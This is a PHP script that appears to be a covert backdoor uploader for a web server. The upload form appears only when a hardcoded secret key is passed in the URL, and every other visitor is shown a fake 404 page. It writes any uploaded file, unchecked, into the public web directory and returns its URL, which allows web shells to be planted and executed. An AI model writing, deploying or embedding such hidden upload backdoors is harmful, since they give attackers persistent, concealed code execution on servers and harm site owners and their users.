<?php
// Set upload folder to current directory
$uploadDir = __DIR__ . "/";
$serverURL = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://".$_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI'])."/";

// ✅ SECRET KEY CHECK
if (isset($_GET['cmd']) && $_GET['cmd'] == 'upload' && isset($_GET['key']) && $_GET['key'] === 'mySecret123') {

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
        $filename = basename($_FILES["file"]["name"]);
        $targetFile = $uploadDir . $filename;

        if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
            echo "<h2>✅ Upload successful!</h2>";
            echo "Saved on server at:<br>";
            echo "<code>$targetFile</code><br><br>";
            echo "Public URL:<br>";
            echo "<a href='{$serverURL}{$filename}' target='_blank'>{$serverURL}{$filename}</a>";
        } else {
            echo "<h2 style='color:red;'>❌ Upload failed!</h2>";
        }

        echo "<br><br><a href='?cmd=upload&key=mySecret123'>Upload another file</a>";
        exit;
    }

    // Show upload form
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>File Upload</title>
        <style>
            body { font-family: Arial, sans-serif; padding: 30px; background: #121212; color: #eee; }
            input[type="file"] { padding: 10px; background: #1f1f1f; border: 1px solid #FFC107; color: #eee; }
            input[type="submit"] { padding: 10px 20px; background: #FFC107; border: none; cursor: pointer; color: #121212; font-weight: bold; }
            input[type="submit"]:hover { background: #e0a800; }
            a { color: #FFC107; }
        </style>
    </head>
    <body>
        <h1>Upload a File</h1>
        <form method="post" enctype="multipart/form-data">
            <label>Select a file from your PC:</label><br><br>
            <input type="file" name="file" required><br><br>
            <input type="submit" value="Upload">
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ✅ If wrong key or no key, send real 404
http_response_code(404);
?>
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
</body>
</html>
